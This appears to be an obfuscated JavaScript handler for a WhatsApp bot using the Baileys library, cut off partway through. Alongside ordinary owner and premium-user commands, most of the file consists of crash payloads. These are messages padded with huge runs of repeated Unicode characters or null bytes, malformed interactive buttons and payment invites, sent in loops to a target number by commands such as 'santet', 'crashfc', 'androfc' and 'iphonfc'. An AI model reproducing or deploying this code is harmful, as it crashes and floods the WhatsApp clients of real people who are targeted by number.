require('./config');
const {
  delay,
  downloadContentFromMessage,
  makeInMemoryStore,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const {
  isUrl,
  sleep,
  await,
  getBuffer,
  getGroupAdmins,
  fetchJson
} = require("./lib/myfunc.js");
const fs = require('fs');
const util = require("util");
const chalk = require("chalk");
const {
  exec,
  spawn,
  execSync
} = require("child_process");
ownerNamee = global.ownerName;
botNamee = global.botName;
Leccy_Auto_Typing = global.Auto_Typing;
Leccy_Auto_Recording = global.Auto_Recording;
Leccy_Auto_RecordType = global.Auto_RecordType;
Leccy_Auto_ReadPesan = global.Auto_ReadPesan;
global.locID = '1';
global.eggID = '15';
let premium = JSON.parse(fs.readFileSync("./db/premium.json"));
let ownerss = JSON.parse(fs.readFileSync("./db/owners.json"));
mute_bot = false;
module.exports = async (_0x23913c, _0x1c8568, _0x2ad031) => {
  try {
    const {
      fromMe: _0x1632d3,
      isBaileys: _0x359157,
      isQuotedMsg: _0x3b2524,
      quotedMsg: _0x4ba652,
      mentioned: _0x150898
    } = _0x1c8568;
    if (_0x1c8568.key && _0x1c8568.key.remoteJid === "status@broadcast") {
      return;
    }
    const _0x20119b = getContentType(_0x1c8568.message);
    const _0x2afcf2 = _0x1c8568.key.remoteJid;
    const _0x27ecdf = _0x20119b === "conversation" && _0x1c8568.message.conversation ? _0x1c8568.message.conversation : _0x20119b == "imageMessage" && _0x1c8568.message.imageMessage.caption ? _0x1c8568.message.imageMessage.caption : _0x20119b == 'documentMessage' && _0x1c8568.message.documentMessage.caption ? _0x1c8568.message.documentMessage.caption : _0x20119b == "videoMessage" && _0x1c8568.message.videoMessage.caption ? _0x1c8568.message.videoMessage.caption : _0x20119b == "extendedTextMessage" && _0x1c8568.message.extendedTextMessage.text ? _0x1c8568.message.extendedTextMessage.text : _0x20119b == "buttonsResponseMessage" && _0x1c8568.message.buttonsResponseMessage.selectedButtonId ? _0x1c8568.message.buttonsResponseMessage.selectedButtonId : _0x20119b == "templateButtonReplyMessage" && _0x1c8568.message.templateButtonReplyMessage.selectedId ? _0x1c8568.message.templateButtonReplyMessage.selectedId : '';
    const _0x36b68d = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(_0x27ecdf) ? _0x27ecdf.match(/^[°•π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi) : '.';
    const _0x2018a7 = _0x27ecdf.replace(_0x36b68d, '').trim().split(/ +/).shift().toLowerCase();
    const _0x3220a1 = _0x27ecdf.trim().split(/ +/).slice(0x1);
    const _0x5a4410 = _0x2afcf2.endsWith("@g.us");
    const _0xc972de = _0x23913c.user.id.split(':')[0x0];
    const _0x4d133f = _0x1c8568.key.fromMe ? _0x23913c.user.id.split(':')[0x0] + '@s.whatsapp.net' || _0x23913c.user.id : _0x1c8568.key.participant || _0x1c8568.key.remoteJid;
    const _0x4c8f98 = _0x4d133f.split('@')[0x0];
    const _0x5ad454 = _0xc972de.includes(_0x4c8f98);
    const _0x2f9f98 = global.devNumber.includes(_0x4c8f98);
    const _0x1cafe0 = [global.devNumber, ...premium].includes(_0x4c8f98);
    const _0xe57628 = ownerss.includes(_0x4c8f98);
    const _0x216c7e = _0x5a4410 ? await _0x23913c.groupMetadata(_0x2afcf2) : '';
    const _0x8e0f9 = _0x5a4410 ? _0x216c7e.subject : '';
    const _0x28142b = _0x5a4410 ? _0x216c7e.participants : '';
    const _0x2958ed = _0x5a4410 ? getGroupAdmins(_0x28142b) : '';
    const _0xfcbb7a = _0x2958ed.includes(_0xc972de + "@s.whatsapp.net") || false;
    const _0x396113 = _0x2958ed.includes(_0x4d133f) || false;
    const _0x2a7e31 = function (_0x1a4fd9) {
      var _0x1a4fd9 = Number(_0x1a4fd9);
      var _0x3c2262 = Math.floor(_0x1a4fd9 / 86400);
      var _0x347936 = Math.floor(_0x1a4fd9 % 86400 / 0xe10);
      var _0x5d0dd8 = Math.floor(_0x1a4fd9 % 0xe10 / 0x3c);
      var _0xbfbaad = Math.floor(_0x1a4fd9 % 0x3c);
      var _0x5ec082 = _0x3c2262 > 0x0 ? _0x3c2262 + (_0x3c2262 == 0x1 ? " Hari, " : " Hari, ") : '';
      var _0x86ebb0 = _0x347936 > 0x0 ? _0x347936 + (_0x347936 == 0x1 ? " Jam, " : " Jam, ") : '';
      var _0xc8c5c5 = _0x5d0dd8 > 0x0 ? _0x5d0dd8 + (_0x5d0dd8 == 0x1 ? " Menit, " : " Menit, ") : '';
      var _0x134bbc = _0xbfbaad > 0x0 ? _0xbfbaad + (_0xbfbaad == 0x1 ? " Detik" : " Detik") : '';
      return _0x5ec082 + _0x86ebb0 + _0xc8c5c5 + _0x134bbc;
    };
    const _0x5ed99e = {
      'key': {
        'fromMe': false,
        'participant': "0@s.whatsapp.net",
        'remoteJid': 'status@broadcast'
      },
      'message': {
        'extendedTextMessage': {
          'text': '*TREEBOT-STRV*'
        }
      }
    };
    const _0x12df7a = async _0x19e3a5 => {
      await _0x23913c.sendMessage(_0x2afcf2, {
        'text': _0x19e3a5
      }, {
        'quoted': _0x1c8568
      });
    };
    const _0x832109 = async _0x124159 => {
      _0x23913c.sendMessage(_0x2afcf2, {
        'react': {
          'text': _0x124159,
          'key': _0x1c8568.key
        }
      });
    };
    function _0x4c78ce(_0x29bacf, _0x1085dd = [], _0x4cf646) {
      if (_0x4cf646 == null || _0x4cf646 == undefined || _0x4cf646 == false) {
        let _0x569990 = _0x23913c.sendMessage(_0x2afcf2, {
          'text': _0x29bacf,
          'mentions': _0x1085dd
        }, {
          'quoted': _0x1c8568
        });
        return _0x569990;
      } else {
        let _0x1a5868 = _0x23913c.sendMessage(_0x2afcf2, {
          'text': _0x29bacf,
          'mentions': _0x1085dd
        }, {
          'quoted': _0x1c8568
        });
        return _0x1a5868;
      }
    }
    function _0x328112(_0x381e2d, _0x2c99b8 = [], _0x394622) {
      if (_0x394622 == null || _0x394622 == undefined || _0x394622 == false) {
        let _0x33dfb1 = _0x23913c.sendMessage(_0x2afcf2, {
          'text': _0x381e2d,
          'mentions': _0x2c99b8
        }, {
          'quoted': _0x1c8568
        });
        return _0x33dfb1;
      } else {
        let _0x176754 = _0x23913c.sendMessage(_0x2afcf2, {
          'text': _0x381e2d,
          'mentions': _0x2c99b8
        }, {
          'quoted': _0x1c8568
        });
        return _0x176754;
      }
    }
    async function _0x4cb34c(_0x280738) {
      var _0x497b53 = generateWAMessageFromContent(_0x280738, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "؂ن؃؄ٽ؂ن؃؄ٽ" + 'ꦾ'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x280738,
        'quoted': _0x5ed99e
      });
      await _0x23913c.relayMessage(_0x280738, _0x497b53.message, {
        'participant': {
          'jid': _0x280738
        },
        'messageId': _0x497b53.key.id
      });
    }
    async function _0x412fc0(_0x260cb6) {
      var _0x39debe = generateWAMessageFromContent(_0x260cb6, proto.Message.fromObject({
        'listMessage': {
          'title': "⟠⿻ 𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈 々" + "\0".repeat(0xf4240),
          'footerText': "𝕾𝖙𝖗𝖆𝖛𝖆𝕺𝖋𝖈",
          'description': "𝕭𝖚𝖌𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "anjay",
              'products': [{
                'productId': '4392524570816732'
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "puki",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': '1679959486',
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': 'whatsapp',
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x260cb6,
        'quoted': _0x5ed99e
      });
      await _0x23913c.relayMessage(_0x260cb6, _0x39debe.message, {
        'participant': {
          'jid': _0x260cb6
        },
        'messageId': _0x39debe.key.id
      });
    }
    async function _0x4fd027(_0x43555a) {
      var _0x3a2f4c = generateWAMessageFromContent(_0x43555a, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': "𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕"
              },
              'body': {
                'text': "𝕾𝖙𝖗𝖆𝖛𝖆-𝕭𝖚𝖌"
              },
              'footer': {
                'text': "𝖂𝖍𝖆𝖙𝖘𝖆𝖕𝖕"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }, {
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }, {
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : '𝕾𝖙𝖗𝖆𝖛𝖆𝕭𝖚𝖌', url : , merchant_url :  }"
                }],
                'messageParamsJson': ''.repeat(0xf4240)
              }
            }
          }
        }
      }), {
        'userJid': _0x43555a,
        'quoted': _0x5ed99e
      });
      await _0x23913c.relayMessage(_0x43555a, _0x3a2f4c.message, {
        'participant': {
          'jid': _0x43555a
        },
        'messageId': _0x3a2f4c.key.id
      });
    }
    async function _0x2a89d5(_0x1cf717) {
      let _0x584d6a = generateWAMessageFromContent(_0x1cf717, {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': proto.Message.InteractiveMessage.create({
              'body': proto.Message.InteractiveMessage.Body.create({
                'text': ''
              }),
              'footer': proto.Message.InteractiveMessage.Footer.create({
                'text': 'ꦾ'.repeat(0x38270)
              }),
              'header': proto.Message.InteractiveMessage.Header.create({
                'title': '',
                'subtitle': '',
                'hasMediaAttachment': false
              }),
              'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                'buttons': [{
                  'name': 'cta_url',
                  'buttonParamsJson': "{ display_text : \" \", url : , merchant_url : \" \"}"
                }],
                'messageParamsJson': "\0".repeat(0x186a0)
              })
            })
          }
        }
      }, {});
      _0x23913c.relayMessage(_0x1cf717, _0x584d6a.message, {
        'participant': {
          'jid': _0x1cf717
        },
        'messageId': _0x584d6a.key.id
      });
    }
    async function _0x3b923e(_0x312ef6) {
      await _0x23913c.relayMessage(_0x312ef6, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': _0x312ef6,
            'participant': _0x312ef6,
            'quotedMessage': {
              'conversation': "؂ن؃؄ٽ؂ن؃؄ٽ".repeat(0xea60)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0x312ef6
        }
      }, {
        'messageId': null
      });
    }
    async function _0x89a34e(_0x2cd8f6) {
      await _0x23913c.relayMessage(_0x2cd8f6, {
        'paymentInviteMessage': {
          'serviceType': "UPI",
          'expiryTimestamp': Date.now() + 86400000
        }
      }, {
        'participant': {
          'jid': _0x2cd8f6
        }
      });
    }
    async function _0x1676d0(_0x4fcc93) {
      await _0x23913c.relayMessage(_0x4fcc93, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 0x6c258c00
        }
      }, {
        'participant': {
          'jid': _0x4fcc93
        }
      });
    }
    async function _0x17ef54(_0x3d4d87, _0x304e84) {
      for (let _0x129697 = 0x0; _0x129697 < _0x304e84; _0x129697++) {
        _0x2a89d5(_0x3d4d87);
        _0x412fc0(_0x3d4d87);
        _0x4cb34c(_0x3d4d87);
        _0x4fd027(_0x3d4d87);
      }
    }
    async function _0x527a2f(_0x839785, _0x1aff37) {
      for (let _0x514b16 = 0x0; _0x514b16 < _0x1aff37; _0x514b16++) {
        _0x412fc0(_0x839785);
        _0x4cb34c(_0x839785);
        _0x4fd027(_0x839785);
        _0x412fc0(_0x839785);
        _0x4cb34c(_0x839785);
        _0x4fd027(_0x839785);
        _0x412fc0(_0x839785);
        _0x4cb34c(_0x839785);
        _0x4fd027(_0x839785);
      }
    }
    const _0x2beff4 = async (_0x161d29, _0x51ea3e) => {
      for (let _0x229b11 = 0x0; _0x229b11 < _0x51ea3e; _0x229b11++) {
        _0x89a34e(_0x161d29);
        _0x3b923e(_0x161d29);
        _0x1676d0(_0x161d29);
        _0x89a34e(_0x161d29);
        _0x3b923e(_0x161d29);
        _0x1676d0(_0x161d29);
        _0x89a34e(_0x161d29);
        _0x3b923e(_0x161d29);
        _0x1676d0(_0x161d29);
      }
    };
    if (Leccy_Auto_Typing) {
      await delay(0x1f4);
      _0x23913c.sendPresenceUpdate("composing", _0x2afcf2);
    }
    if (Leccy_Auto_Recording) {
      await delay(0x1f4);
      _0x23913c.sendPresenceUpdate("recording", _0x2afcf2);
    }
    if (Leccy_Auto_ReadPesan) {
      await delay(0x1f4);
      _0x23913c.readMessages([_0x1c8568.key]);
    }
    if (mute_bot) {
      if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454) {
        return;
      }
    }
    if (_0x5a4410) {
      if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454 && !_0x1cafe0) {
        return;
      }
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Group Chat :")));
      console.log(chalk.black(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x27ecdf || _0x20119b)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x1c8568.pushName), chalk.yellow(_0x4d133f.split('@')[0x0]) + "\n" + chalk.blueBright("=> in"), chalk.green(_0x8e0f9, _0x2afcf2));
    } else {
      if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454 && !_0x1cafe0) {
        return;
      }
      console.log(chalk.bgBlack(chalk.redBright("\n===========================================\n")));
      console.log(chalk.black(chalk.white("Private Chat :")));
      console.log(chalk.bgBlack(chalk.cyan("- Message :")), chalk.black(chalk.greenBright(_0x27ecdf || _0x20119b)) + "\n" + chalk.magenta("- From :"), chalk.green(_0x1c8568.pushName), chalk.yellow(_0x4d133f.split('@')[0x0]) + "\n");
    }
    switch (_0x2018a7) {
      case "mute":
        if (!_0x2f9f98) {
          return _0x12df7a("This feature can only be used by the owner");
        }
        if (mute_bot == true) {
          return _0x12df7a("*The bot was in self mode before*");
        }
        mute_bot = true;
        _0x12df7a("*Successfully Activated Self Mode!*");
        break;
      case "unmute":
        if (!_0x2f9f98) {
          return _0x12df7a("This feature can only be used by the owner");
        }
        if (mute_bot == false) {
          return _0x12df7a("*The bot has been in self mode before*");
        }
        mute_bot = false;
        _0x12df7a("*successfully Turned Off Self Mode!*");
        break;
      case 'stopjadibot':
        if (!fs.existsSync("./database/jadibot/" + _0x4d133f.split('@')[0x0])) {
          return _0x12df7a("*Maaf, Kamu Tidak Terdaftar Jadibot!*");
        }
        exec("rm -r database/jadibot/" + _0x4d133f.split('@')[0x0]);
        _0x12df7a("*succesfully delete session ✓*");
        break;
      case "del-sesi":
        {
          if (!q) {
            return _0x12df7a("EX: .d-sesi 628xxxx");
          }
          if (!_0x2f9f98) {
            return _0x12df7a("This feature can only be used by the owner");
          }
          num = q.replace(/[^0-9]/g, '');
          if (!fs.existsSync('./database/jadibot/' + num)) {
            return _0x12df7a("*Maaf, Nomor itu Tidak Terdaftar Jadibot!*");
          }
          exec("rm -r database/jadibot/" + num);
          mensesi = num + "@s.whatsapp.net";
          _0x4c78ce("*succesfully delete session* @" + mensesi.split('@')[0x0], [mensesi]);
        }
        break;
      case 'resetjadibot':
        if (!_0x2f9f98) {
          return _0x12df7a("This feature can only be used by the owner");
        }
        exec("rm -r database/jadibot/" + _0x4d133f.split('@')[0x0]);
        _0x12df7a("*succesfully restart session ✓*");
        await sleep(0xbb8);
        process.exit();
        break;
      case "listjadibot":
        if (!_0x2f9f98) {
          return _0x12df7a("This feature can only be used by the owner");
        }
        xxjdb = 0x1;
        const {
          jadibot: _0x7a2129,
          conns: _0x5c5ba5
        } = require('./lib/jadibot');
        try {
          let _0x1c554f = [...new Set([...global.conns.filter(_0x3aa8ef => _0x3aa8ef.user).map(_0x2b694e => _0x2b694e.user)])];
          te = "▬▭▬▭▬▭▬▭▬▭▬▭\n*LISTJADIBOT-TREE*\n*Total Users* : " + _0x1c554f.length + "\n▬▭▬▭▬▭▬▭▬▭▬▭\n";
          for (let _0x1b0af0 of _0x1c554f) {
            y = await _0x23913c.decodeJid(_0x1b0af0.id);
            te += "*⭔UserID* : " + ('' + xxjdb++) + "\n";
            te += "*⭔Number* : @" + y.split('@')[0x0] + "\n▬▭▬▭▬▭▬▭▬▭▬▭\n";
          }
          _0x23913c.sendTextWithMentions(_0x2afcf2, te, _0x1c8568);
        } catch (_0x29b7d3) {
          _0x12df7a("Belum Ada User Yang Jadibot");
        }
        break;
      case "jadibot":
        {
          if (!q) {
            return _0x12df7a("EX: .jadibot 628xxxx");
          }
          if (!_0x2f9f98) {
            return _0x12df7a("This feature can only be used by the owner");
          }
          num = q.replace(/[^0-9]/g, '');
          myown = _0xc972de + "@s.whatsapp.net";
          mynum = num + '@s.whatsapp.net';
          if (fs.existsSync("./database/jadibot/" + num)) {
            return _0x4c78ce("*mohon maaf* @" + mynum.split('@')[0x0] + " ^_^\n*session users masih terdaftar.*\n\n*silahkan ketik* .stopjadibot\n*untuk menghapus session ✓*", [mynum]);
          }
          _0x12df7a("*We are processing your request.*");
          const {
            jadibot: _0x1e6ca1,
            conns: _0x4bf8d3
          } = require('./lib/jadibot');
          await sleep(0xdac);
          txtt = "*MASUKKAN CODE PAIRING DIBAWAH INI*\n*UNTUK MENJADI BOT SEMENTARA ✓*\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk perangkat tertaut\n3. Ketuk tautkan perangkat\n4. Ketuk tautkan dengan nomor telepon saja\n5. Masukkan code pairing dibawah ini\n\n*Code Pairing :* `" + global.codepairing + "`\n\n*Note:*\n_Code dapat expired kapan saja._\n_Jika code error silahkan ketik_ ⇩\n\n========[  !stopjadibot  ]========";
          _0x23913c.sendMessage(mynum, {
            'text': txtt
          }).then(() => _0x23913c.sendMessage(_0x2afcf2, {
            'text': "*Succesfully Send Pairing Code* @" + mynum.split('@')[0x0],
            'mentions': [mynum]
          })).then(() => _0x23913c.sendMessage(_0x4d133f, {
            'text': global.codepairing
          }, {
            'quoted': _0x1c8568
          }));
        }
        break;
      case "listprem":
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454) {
            return;
          }
          let _0x54f647 = JSON.parse(fs.readFileSync("./db/premium.json"));
          if (_0x54f647.length == 0x0) {
            return _0x12df7a("*there are not Premium Users in the database*");
          }
          var _0x5f02d4 = "_*LIST USER PREMIUM*_\n*Total User :* " + _0x54f647.length + "\n\n";
          var _0x20f5c0 = 0x1;
          for (let _0xf2718e of _0x54f647) {
            _0x5f02d4 += "Users : " + _0x20f5c0++ + "\nNumber : @" + _0xf2718e + "\n\n";
          }
          _0x23913c.sendTextWithMentions(_0x2afcf2, _0x5f02d4, _0x1c8568);
        }
        break;
      case "addprem":
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454) {
            return;
          }
          if (!_0x3220a1[0x0]) {
            return _0x12df7a("Use " + (_0x36b68d + _0x2018a7) + " number\nExample " + (_0x36b68d + _0x2018a7) + " 628xxxxx");
          }
          bnnd = q.replace(/[^0-9]/g, '');
          let _0x5940a8 = await _0x23913c.onWhatsApp(bnnd + "@s.whatsapp.net");
          if (_0x5940a8.length == 0x0) {
            return _0x12df7a("_Enter A Valid And Registered Number On WhatsApp!!_");
          }
          if (premium.includes(bnnd)) {
            return _0x12df7a("_Nomor Tersebut Sudah Premium !!_");
          }
          premium.push(bnnd);
          fs.writeFileSync("./db/premium.json", JSON.stringify(premium));
          let _0x495154 = bnnd + "@s.whatsapp.net";
          _0x4c78ce("*Success Added @" + _0x495154.split('@')[0x0] + " To the Premium Users Database*", [_0x495154]);
          await sleep(0x9c4);
          _0x23913c.sendMessage(_0x495154, {
            'text': "*Congratulations users, you can now use premium features*"
          });
        }
        break;
      case "delprem":
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454) {
            return;
          }
          if (!_0x3220a1[0x0]) {
            return _0x12df7a("Use " + (_0x36b68d + _0x2018a7) + " number\nExample " + (_0x36b68d + _0x2018a7) + " 628xxxxx");
          }
          ya = q.replace(/[^0-9]/g, '');
          unp = premium.indexOf(ya);
          if (!premium.includes(ya)) {
            return _0x12df7a("_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Users Premium!!_");
          }
          premium.splice(unp, 0x1);
          fs.writeFileSync("./db/premium.json", JSON.stringify(premium));
          let _0x24346b = ya + "@s.whatsapp.net";
          _0x4c78ce("*Deleting Success @" + _0x24346b.split('@')[0x0] + " In the Users Premium database*", [_0x24346b]);
          await sleep(0x9c4);
          _0x23913c.sendMessage(_0x24346b, {
            'text': "*Well, it's a shame, you can no longer access premium features because they were deleted*"
          });
        }
        break;
      case "listown":
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454) {
            return;
          }
          let _0x1bad11 = JSON.parse(fs.readFileSync('./db/owners.json'));
          if (_0x1bad11.length == 0x0) {
            return _0x12df7a("*there are not Premium Users in the database*");
          }
          var _0x5f02d4 = "_*LIST USER PREMIUM*_\n*Total User :* " + _0x1bad11.length + "\n\n";
          var _0x20f5c0 = 0x1;
          for (let _0xf537ed of _0x1bad11) {
            _0x5f02d4 += "Users : " + _0x20f5c0++ + "\nNumber : @" + _0xf537ed + "\n\n";
          }
          _0x23913c.sendTextWithMentions(_0x2afcf2, _0x5f02d4, _0x1c8568);
        }
        break;
      case "addown":
        {
          if (!_0x2f9f98 && !_0x5ad454) {
            return;
          }
          if (!_0x3220a1[0x0]) {
            return _0x12df7a("Use " + (_0x36b68d + _0x2018a7) + " number\nExample " + (_0x36b68d + _0x2018a7) + " 628xxxxx");
          }
          bnnd = q.replace(/[^0-9]/g, '');
          let _0x5bf101 = await _0x23913c.onWhatsApp(bnnd + "@s.whatsapp.net");
          if (_0x5bf101.length == 0x0) {
            return _0x12df7a("_Enter A Valid And Registered Number On WhatsApp!!_");
          }
          if (ownerss.includes(bnnd)) {
            return _0x12df7a("_Nomor Tersebut Sudah Menjadi Owners !!_");
          }
          ownerss.push(bnnd);
          fs.writeFileSync("./db/owners.json", JSON.stringify(ownerss));
          let _0x32fa52 = bnnd + "@s.whatsapp.net";
          _0x4c78ce("*Success Added @" + _0x32fa52.split('@')[0x0] + " To the Owners Users Database*", [_0x32fa52]);
          await sleep(0x9c4);
          _0x23913c.sendMessage(_0x32fa52, {
            'text': "*Congratulations users, you can now use owners features*"
          });
        }
        break;
      case "delown":
        {
          if (!_0x2f9f98 && !_0x5ad454) {
            return;
          }
          if (!_0x3220a1[0x0]) {
            return _0x12df7a("Use " + (_0x36b68d + _0x2018a7) + " number\nExample " + (_0x36b68d + _0x2018a7) + " 628xxxxx");
          }
          ya = q.replace(/[^0-9]/g, '');
          unp = ownerss.indexOf(ya);
          if (!ownerss.includes(ya)) {
            return _0x12df7a("_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Owners Bot!!_");
          }
          ownerss.splice(unp, 0x1);
          fs.writeFileSync("./db/owners.json", JSON.stringify(ownerss));
          let _0x4aa481 = ya + "@s.whatsapp.net";
          _0x4c78ce("*Deleting Success @" + _0x4aa481.split('@')[0x0] + " In the Users owners database*", [_0x4aa481]);
          await sleep(0x9c4);
          _0x23913c.sendMessage(_0x4aa481, {
            'text': "*Well, it's a shame, you can no longer access owners features because they were deleted*"
          });
        }
        break;
      case '🌹':
      case '🌷':
      case '🔥':
      case '🦖':
      case '🦕':
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454) {
            return;
          }
          if (!q) {
            return _0x12df7a("*Example :*\n" + _0x2018a7 + " 3");
          }
          if (isNaN(parseInt(q))) {
            return _0x12df7a("Jumlah Wajib Angka!!");
          }
          if (_0x2afcf2 == global.devNumber.includes + "@s.whatsapp.net") {
            return;
          }
          if (_0x2afcf2 == "6283834558105@s.whatsapp.net") {
            return;
          }
          if (_0x2afcf2 == "6283854543070@s.whatsapp.net") {
            return;
          }
          inijumlaaaa = encodeURI(q);
          _0x832109('⏳');
          await sleep(0x7d0);
          _0x832109('✅');
          await sleep(0x3e8);
          _0x527a2f(_0x2afcf2, inijumlaaaa);
        }
        break;
      case 'bom-ip':
      case "bug-ip":
      case 'crash-ip':
      case "home-ip":
      case "blank-ip":
      case "crash-ip":
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454) {
            return;
          }
          jumlaaah = q ? q : '8';
          if (isNaN(parseInt(jumlaaah))) {
            return _0x12df7a("Jumlah Wajib Angka!!");
          }
          if (_0x2afcf2 == global.devNumber.includes + "@s.whatsapp.net") {
            return;
          }
          if (_0x2afcf2 == "6283834558105@s.whatsapp.net") {
            return;
          }
          if (_0x2afcf2 == '6283854543070@s.whatsapp.net') {
            return;
          }
          inijumlaaaa = encodeURI(jumlaaah) * 0x3;
          _0x832109('⏳');
          await sleep(0x5dc);
          _0x2beff4(_0x2afcf2, inijumlaaaa);
          await sleep(0x9c4);
          _0x832109('✅');
        }
        break;
      case "gaslec":
      case "bugui":
      case 'homecrash':
      case "crashfc":
      case "infinity":
      case "gaslec":
      case "lecunli":
      case "santet":
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454 && !_0x1cafe0) {
            return;
          }
          galakujiku = q.replace(/[^0-9]/g, '');
          if (!galakujiku) {
            return _0x12df7a("*Format :*\n" + (_0x36b68d + _0x2018a7) + " 628xxxx");
          }
          if (galakujiku == global.devNumber.includes) {
            return;
          }
          if (galakujiku == "6283834558105") {
            return;
          }
          if (galakujiku == "6283854543070") {
            return;
          }
          let _0x45a9a6 = await _0x23913c.onWhatsApp(galakujiku + "@s.whatsapp.net");
          if (_0x45a9a6.length == 0x0) {
            return _0x12df7a("*The number is not registered in the WhatsApp application.*");
          }
          ha_wkwk = galakujiku + "@s.whatsapp.net";
          _0x12df7a("*Bugs Are Being Processed...*");
          await sleep(0x8fc);
          _0x328112("*Succesfully Send " + _0x2018a7 + " To @" + ha_wkwk.split('@')[0x0] + ", With The Amount Of Spam 10*", [ha_wkwk]);
          await sleep(0x5dc);
          _0x17ef54(ha_wkwk, 0xa);
        }
        break;
      case "androfc":
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454 && !_0x1cafe0) {
            return;
          }
          if (!q) {
            return _0x12df7a("*Format :*\n" + (_0x36b68d + _0x2018a7) + " 628xxxx,1");
          }
          target_orang = q.split(',')[0x0];
          jumla_spamm = q.split(',')[0x1] ? q.split(',')[0x1] : '2';
          if (isNaN(parseInt(jumla_spamm))) {
            return _0x12df7a("Jumlah wajib angka!!");
          }
          meluatke = target_orang.replace(/[^0-9]/g, '');
          let _0x32a6e5 = await _0x23913c.onWhatsApp(meluatke + "@s.whatsapp.net");
          if (_0x32a6e5.length == 0x0) {
            return _0x12df7a("*The number is not registered in the WhatsApp application.*");
          }
          if (meluatke == global.devNumber.includes) {
            return;
          }
          if (meluatke == '6283834558105') {
            return;
          }
          if (meluatke == "6283854543070") {
            return;
          }
          let _0x3a54fd = meluatke + "@s.whatsapp.net";
          jumlah = encodeURI(jumla_spamm) * 0x2;
          _0x12df7a("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x328112("*Succesfully Send Bug-Android To @" + _0x3a54fd.split('@')[0x0] + ", With The Amount Of Spam " + jumlah + '*', [_0x3a54fd]);
          await sleep(0x4b0);
          _0x527a2f(_0x3a54fd, jumlah);
        }
        break;
      case "iphonfc":
        {
          if (!_0x2f9f98 && !_0xe57628 && !_0x5ad454 && !_0x1cafe0) {
            return;
          }
          if (!q) {
            return _0x12df7a("*Format :*\n" + (_0x36b68d + _0x2018a7) + " 628xxxx,1");
          }
          target_orang = q.split(',')[0x0];
          jumla_spamm = q.split(',')[0x1] ? q.split(',')[0x1] : '2';
          if (isNaN(parseInt(jumla_spamm))) {
            return _0x12df7a("Jumlah wajib angka!!");
          }
          meluatke = target_orang.replace(/[^0-9]/g, '');
          let _0x249bb0 = await _0x23913c.onWhatsApp(meluatke + "@s.whatsapp.net");
          if (_0x249bb0.length == 0x0) {
            return _0x12df7a("*The number is not registered in the WhatsApp application.*");
          }
          if (meluatke == global.devNumber.includes) {
            return;
          }
          if (meluatke == "6283834558105") {
            return;
          }
          if (meluatke == "6283854543070") {
            return;
          }
          let _0x32d95b = meluatke + "@s.whatsapp.net";
          jumlah = encodeURI(jumla_spamm) * 0xa;
          _0x12df7a("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x328112("*Succesfully Send Bug-iPhone To @" + _0x32d95b.split('@')[0x0] + ", With The Amount Of Spam " + jumlah + '*', [_0x32d95b]);
          await sleep(0x4b0);
